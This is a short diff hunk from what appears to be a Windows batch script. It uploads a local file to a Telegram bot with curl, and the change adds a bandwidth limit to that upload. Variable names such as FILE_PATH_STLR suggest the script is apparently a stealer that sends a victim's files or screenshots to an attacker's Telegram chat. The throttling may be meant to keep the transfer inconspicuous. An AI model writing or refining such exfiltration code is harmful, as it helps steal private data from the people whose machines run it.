@@ -149,7 +149,8 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendDocument" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
      -F "caption=%CAPTION_MyScrn%" ^
-     -F "document=@%FILE_PATH_STLR%"
+     -F "document=@%FILE_PATH_STLR%" ^
+     --limit-rate 50K
 
 
 
